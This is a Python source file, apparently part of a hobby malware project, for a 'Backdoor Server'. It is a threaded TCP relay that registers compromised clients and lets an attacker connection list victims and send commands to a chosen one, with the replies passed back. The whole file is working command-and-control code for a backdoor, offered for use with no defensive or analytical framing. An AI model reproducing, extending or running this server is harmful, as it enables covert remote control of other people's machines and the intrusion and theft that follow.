import socket
import threading

HEADER = 8192
PORT = 0  # Replace 0 With Your Port Number
SERVER = "0.0.0.0"
ADDR = (SERVER, PORT)
FORMAT = "utf-8"
attacker = []
client = []
clients = []
selectedclient = ""
clientnum = ""
messageA = ""
messageC = ""

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(ADDR)


def get_clients(l):
    result = ""
    for c in l:
        result += str(c[0]) + "<>" + str(c[1]) + "<c>"
    return result


def handle_connection(conn, addr):
    try:
        global attacker
        global client
        global clients
        global selectedclient
        global clientnum
        global messageA
        global messageC
        i = 0
        loop = False
        while True:
            msg = conn.recv(HEADER).decode(FORMAT)
            if msg:
                loop = True
            while loop:
                if "<?CLIENT?>" in msg:
                    clientnum, messageC = str(msg).split("<?CLIENT?>")
                    if i == 0:
                        cac = (clientnum, addr, conn)
                        clients.append(cac)
                        print("\033[2;33;5m" + str(addr) + ":" + clientnum + " client connected")
                    i = 1
                    if selectedclient:
                        for c in clients:
                            if c[1] == addr:
                                if c[0] == selectedclient:
                                    print("\033[2;0;5m client: " + messageC)
                                    if messageC:
                                        if attacker:
                                            attacker[0].send(messageC.encode(FORMAT))
                                            messageC = ""
                                        else:
                                            break
                                    selectedclient = ""
                                    loop = False
                                else:
                                    loop = False
                            else:
                                loop = False
                    else:
                        loop = False
                else:
                    loop = False

            if "<?ATTACKER?>" in msg:
                attacker = conn, addr
                while True:
                    selectedclient, messageA = str(msg).split("<?ATTACKER?>")
                    if "getclients" in messageA:
                        result = get_clients(clients)
                        attacker[0].send(result.encode(FORMAT))
                        messageA = ""
                        break
                    elif clients and "getclients" not in messageA:
                        print("\033[2;0;5m attacker: " + messageA)
                        for c in clients:
                            if c[0] == selectedclient:
                                c[2].send(messageA.encode(FORMAT))
                        messageA = ""
                        break
    except:
        attacker = []
        for c in clients:
            if c == cac:
                clients.remove(c)
                print(str(c[1]) + ":" + str(c[0]) + " disconnected\033[2;33;5m")


def start():
    server.listen(100)
    print(f"[LISTENING] Server is listening on {SERVER}:{PORT}")
    while True:
        conn, addr = server.accept()
        thread1 = threading.Thread(target=handle_connection, args=(conn, addr))
        thread1.start()


print("""\033[2;31;5m
  ____  ____  _            _____       
 |___ \|  _ \(_)          |  __ \      
   __) | |_) |___  ____  _| |__) |   _ 
  |__ <|  _ <| \ \/ /\ \/ /  ___/ | | |
  ___) | |_) | |>  <  >  <| |   | |_| |
 |____/|____/|_/_/\_\/_/\_\_|    \__, |
                                  __/ |
                                 |___/ 
          Backdoor Server
""")
print("\033[2;32;5m[STARTING] server is starting...")
start()

